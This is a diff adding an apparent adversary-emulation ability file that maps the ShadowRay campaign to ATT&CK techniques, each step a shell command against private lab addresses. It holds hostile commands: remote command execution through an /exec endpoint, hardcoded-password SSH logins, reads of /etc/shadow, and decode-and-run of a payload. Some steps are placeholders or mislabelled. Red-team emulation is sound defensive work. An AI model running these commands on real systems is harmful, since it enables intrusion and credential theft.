@@ -1,0 +1,167 @@
+[
+  {
+    "ability_id": "0fa06c9c-fd66-52f1-b94a-83cb37bee900",
+    "name": "T1190 - Exploit Public-Facing Application",
+    "tactic": "initial-access",
+    "technique_name": "Exploit Public-Facing Application",
+    "technique_id": "T1190",
+    "description": "During ShadowRay, threat actors exploited CVE-2023-48022 on publicly exposed Ray servers to steal computing power and to expose sensitive data.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+      }
+    ]
+  },
+  {
+    "ability_id": "1faec135-c77f-5da2-a384-c2d468cc942a",
+    "name": "T1027.013 - Encrypted/Encoded File",
+    "tactic": "defense-evasion",
+    "technique_name": "Encrypted/Encoded File",
+    "technique_id": "T1027.013",
+    "description": "During ShadowRay, threat actors used Base64-encrypted Python code to evade detection.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'base64 -d /tmp/encoded_payload.b64 > /tmp/payload.py && python3 /tmp/payload.py'"
+      }
+    ]
+  },
+  {
+    "ability_id": "810c3322-4d43-5152-8d14-b11e78b7b50d",
+    "name": "T1003.008 - /etc/passwd and /etc/shadow",
+    "tactic": "credential-access",
+    "technique_name": "/etc/passwd and /etc/shadow",
+    "technique_id": "T1003.008",
+    "description": "During ShadowRay, threat actors used `cat /etc/shadow` to steal password hashes.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sudo cat /etc/passwd' && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sudo cat /etc/shadow'"
+      }
+    ]
+  },
+  {
+    "ability_id": "60684dd3-782f-5675-bca6-d45648687755",
+    "name": "T1546.004 - Unix Shell Configuration Modification",
+    "tactic": "privilege-escalation",
+    "technique_name": "Unix Shell Configuration Modification",
+    "technique_id": "T1546.004",
+    "description": "During ShadowRay, threat actors executed commands on interactive and reverse shells.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 echo '$(whoami) on $(uname -n)'"
+      }
+    ]
+  },
+  {
+    "ability_id": "5c0eccee-eee4-5d88-b6e5-c83b25d44eaa",
+    "name": "T1588.002 - Tool",
+    "tactic": "resource-development",
+    "technique_name": "Tool",
+    "technique_id": "T1588.002",
+    "description": "During ShadowRay, threat actors used tools including the XMRig miner and Interactsh.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'nc -v'"
+      }
+    ]
+  },
+  {
+    "ability_id": "368d9d4f-6c23-5351-9f74-69dc719886b6",
+    "name": "T1105 - Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "technique_name": "Ingress Tool Transfer",
+    "technique_id": "T1105",
+    "description": "During ShadowRay, threat actors downloaded and executed the XMRig miner on targeted hosts.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd'  ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 \"echo 'mining crypto coins'\""
+      }
+    ]
+  },
+  {
+    "ability_id": "6a74f881-117b-58f2-aa4f-4e976e204f07",
+    "name": "T1059.006 - Python",
+    "tactic": "execution",
+    "technique_name": "Python",
+    "technique_id": "T1059.006",
+    "description": "During ShadowRay, threat actors used the Python `pty` module to open reverse shells.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "ccurl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+      }
+    ]
+  },
+  {
+    "ability_id": "d6966fcc-0455-51cb-932c-c707f97730f4",
+    "name": "T1016 - System Network Configuration Discovery",
+    "tactic": "discovery",
+    "technique_name": "System Network Configuration Discovery",
+    "technique_id": "T1016",
+    "description": "During ShadowRay, threat actors invoked DNS queries from targeted machines to identify their IP addresses.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 \"ifconfig -a; ip route; arp -a; hostname -I; nslookup $(hostname)\" && sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 \"sshpass -p 'Passw0rd' ssh attacker@172.22.0.20 'ifconfig -a; ip route; arp -a; hostname -I; nslookup \\$(hostname)'\""
+      }
+    ]
+  },
+  {
+    "ability_id": "8130dba3-f51c-57d2-9d49-78e9b0bb3c4b",
+    "name": "T1068 - Exploitation for Privilege Escalation",
+    "tactic": "privilege-escalation",
+    "technique_name": "Exploitation for Privilege Escalation",
+    "technique_id": "T1068",
+    "description": "During ShadowRay, threat actors downloaded a privilege escalation payload to gain root access.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 wget https://nmap.org/dist/nmap-7.98.tgz"
+      }
+    ]
+  },
+  {
+    "ability_id": "22545851-970c-5709-bdbc-463e83521af0",
+    "name": "T1496.001 - Compute Hijacking",
+    "tactic": "impact",
+    "technique_name": "Compute Hijacking",
+    "technique_id": "T1496.001",
+    "description": "During ShadowRay, threat actors leveraged graphics processing units (GPU) on compromised nodes for cryptocurrency mining.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo 'mining crypto'"
+      }
+    ]
+  },
+  {
+    "ability_id": "22545851-970c-5709-bdbc-rothshadow",
+    "name": "END OF EMULATION",
+    "tactic": "impact",
+    "technique_name": "System Shutdown",
+    "technique_id": "T1529",
+    "description": "This is the end.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo \"END OF SALESFORCE DATA EXFILTRATION\""
+      }
+    ]
+  }    
+]
